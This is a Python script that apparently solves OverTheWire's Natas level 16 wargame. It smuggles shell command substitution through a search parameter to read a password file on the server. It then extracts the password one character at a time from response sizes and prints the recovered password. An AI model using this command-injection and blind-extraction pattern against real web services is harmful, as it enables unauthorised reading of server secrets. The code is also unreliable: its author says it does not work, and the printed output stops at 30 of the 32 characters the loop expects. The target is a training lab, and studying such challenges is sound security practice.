import requests

with open("passwords.txt") as f:
    n16_pass = f.read().splitlines()[16].split(":")[1]

password_letters = []
chararcter_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for current_char in range(1, 33):

    extract_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c{current_char}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
    requests.post(extract_letter_url, auth=('natas16', n16_pass))

    for search_letter in chararcter_list:
        check_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+{search_letter}+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
        response = requests.get(check_letter_url, auth=('natas16', n16_pass))

        if len(response.text) < 461926:
            password_letters.append(search_letter)
            print(f"{password_letters}\t{100*len(password_letters)/32}% done")
            break

print("Natas17 Password:", ''.join(password_letters))

#ok nvm this code doesnt even work :O


# Heres the output after running for those trying to solve issue:
#
#     ['E'], 3.125 % done
#     ['E', 'q'], 6.25 % done
#     ['E', 'q', 'j'], 9.375 % done
#     ['E', 'q', 'j', 'H'], 12.5 % done
#     ['E', 'q', 'j', 'H', 'J'], 15.625 % done
#     ['E', 'q', 'j', 'H', 'J', 'b'], 18.75 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o'], 21.875 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7'], 25.0 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O'], 28.125 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5'], 31.25 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b'], 34.375 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O'], 37.5 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v'], 40.625 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O'], 43.75 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H'], 46.875 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b'], 50.0 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9'], 53.125 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's'], 56.25 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7'], 59.375 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5'], 62.5 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h'], 65.625 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o'], 68.75 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k'], 71.875 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h'], 75.0 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5'], 78.125 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T'], 81.25 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F'], 84.375 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F', '0'], 87.5 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F', '0', 'O'], 90.625 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F', '0', 'O', 'C'], 93.75 % done
#     ['E', 'q', 'j', 'H', 'J', 'b', 'o', '7', 'O', '5', 'b', 'O', 'v', 'O', 'H', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F', '0', 'O', 'C']
#     EqjHJbo7O5bOvOHb9s75hokh5TF0OC